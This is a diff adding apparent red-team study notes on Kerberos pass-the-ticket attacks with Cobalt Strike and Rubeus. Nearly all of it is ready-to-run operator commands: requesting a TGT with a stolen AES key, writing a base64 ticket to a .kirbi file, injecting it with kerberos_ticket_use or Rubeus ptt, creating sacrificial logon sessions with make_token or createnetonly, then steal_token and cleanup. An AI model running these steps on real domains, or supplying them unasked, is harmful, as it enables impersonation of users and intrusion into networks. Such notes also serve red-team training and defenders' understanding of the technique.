@@ -69,6 +69,50 @@ allows adversary to leverage NTLM hash to impersonate a user. However NTLM is di
 Beacon pth donain\user hash 
 - wrapper for sekurlsa::pth
 
+Pass the ticket (PTT)
+
+Requesting Ticket Granting Ticket (TGT)
+-Adversary can request a TGT if they have the ntlm hash or the  aes encryption key. Using the NTLM generates a RC4 and is not good opsec
+
+Rubeus asktgt: will return ticket in base64
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
+
+Injecting the ticket
+
+Use powershell to save to ticket to local machine:
+
+powershell $ticket = "doIFo[...snip...]kNPTQ=="
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))
+
+kerberos_ticket_use <-- appply ticket to current seesion after it is saved with above command.
+
+To avoid causing issues to actual user we can create a token with a fake passsword and assign the ticket to it
+
+klist <-- to see current user info
+
+make_token doman\user FakePass <-- replace domain and user
+kerberos_ticket_use <-- assign a ticket to the new impersonated user
+kerberos_ticket_use C:\Users\Attacker\Desktop\user.kirbi
+
+kerberos_ticket_use <-- ISSUES will only import TGT and not Service Ticket and second it relies on the kirbi to be saved on the attack disk.
+
+Injecting with Rubeus 
+
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:[luid] /ticket:[ticket]
+- The command can take a base64 encoded ticket or the path to a kirbi, with this the kirbi is on the beacon disk not attacker disk.
+
+Instead of using make_token we can use createnetonly <-- spawns a hidden process and returns the luid and PID
+
+STEPS
+- execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:user_name /domain:domaim_tld /password:FakePass
+- execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x132ef34 /ticket:doIFoDCCBZygAwIBBaE...... <-- we get this from the asktgt
+- steal_token #PID from the 1st step
+Clean up
+rev2self
+kill
+
+
+
 
 
 
